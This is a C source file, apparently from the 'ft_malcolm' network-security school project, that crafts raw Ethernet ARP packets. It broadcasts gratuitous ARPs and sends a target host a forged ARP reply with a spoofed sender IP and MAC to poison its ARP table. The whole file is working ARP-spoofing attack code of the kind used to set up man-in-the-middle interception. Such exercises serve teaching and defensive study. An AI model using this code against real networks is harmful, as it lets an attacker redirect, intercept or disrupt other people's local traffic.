#include "ft_malcolm.h"

static void	init_arp_hdr(t_arp_packet *pkt, t_malcolm *ctx)
{
	pkt->eth.ethertype = htons(ETH_P_ARP);
	pkt->arp.hw_type = htons(ARP_HW_ETHER);
	pkt->arp.proto_type = htons(ARP_PROTO_IPV4);
	pkt->arp.hw_len = MAC_LEN;
	pkt->arp.proto_len = IPV4_LEN;
	pkt->arp.opcode = htons(ARP_OP_REPLY);
	ft_memcpy(pkt->eth.src, ctx->source_mac, MAC_LEN);
	ft_memcpy(pkt->arp.sender_mac, ctx->source_mac, MAC_LEN);
	ft_memcpy(pkt->arp.sender_ip, ctx->source_ip, IPV4_LEN);
}

static int	do_send(t_malcolm *ctx, t_arp_packet *pkt)
{
	struct sockaddr_ll	sll;

	ft_bzero(&sll, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = ctx->iface_index;
	sll.sll_halen = MAC_LEN;
	ft_memcpy(sll.sll_addr, pkt->eth.dest, MAC_LEN);
	if (sendto(ctx->sockfd, pkt, sizeof(*pkt), 0,
			(struct sockaddr *)&sll, sizeof(sll)) < 0)
	{
		fprintf(stderr, "%s: sendto: %s\n", PROGRAM_NAME, strerror(errno));
		return (-1);
	}
	return (0);
}

int	send_gratuitous_arp(t_malcolm *ctx)
{
	static const uint8_t	bcast[MAC_LEN] = {
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff
	};
	t_arp_packet			pkt;

	printf("Sending gratuitous ARP for ");
	print_ip(ctx->source_ip);
	printf(" with mac ");
	print_mac(ctx->source_mac);
	printf("...\n");
	ft_bzero(&pkt, sizeof(pkt));
	init_arp_hdr(&pkt, ctx);
	ft_memcpy(pkt.eth.dest, bcast, MAC_LEN);
	ft_memcpy(pkt.arp.target_mac, bcast, MAC_LEN);
	ft_memcpy(pkt.arp.target_ip, ctx->source_ip, IPV4_LEN);
	if (ctx->verbose)
		print_verbose_pkt(&pkt, sizeof(pkt), 1);
	if (do_send(ctx, &pkt) != 0)
		return (-1);
	printf("Gratuitous ARP sent.\nExiting program...\n");
	return (0);
}

int	send_arp_reply(t_malcolm *ctx)
{
	t_arp_packet	pkt;

	printf("Now sending an ARP reply to the target address "
		"with spoofed source, please wait...\n");
	ft_bzero(&pkt, sizeof(pkt));
	init_arp_hdr(&pkt, ctx);
	ft_memcpy(pkt.eth.dest, ctx->target_mac, MAC_LEN);
	ft_memcpy(pkt.arp.target_mac, ctx->target_mac, MAC_LEN);
	ft_memcpy(pkt.arp.target_ip, ctx->target_ip, IPV4_LEN);
	if (ctx->verbose)
		print_verbose_pkt(&pkt, sizeof(pkt), 1);
	if (do_send(ctx, &pkt) != 0)
		return (-1);
	printf("Sent an ARP reply packet, you may now check "
		"the arp table on the target.\n");
	return (0);
}
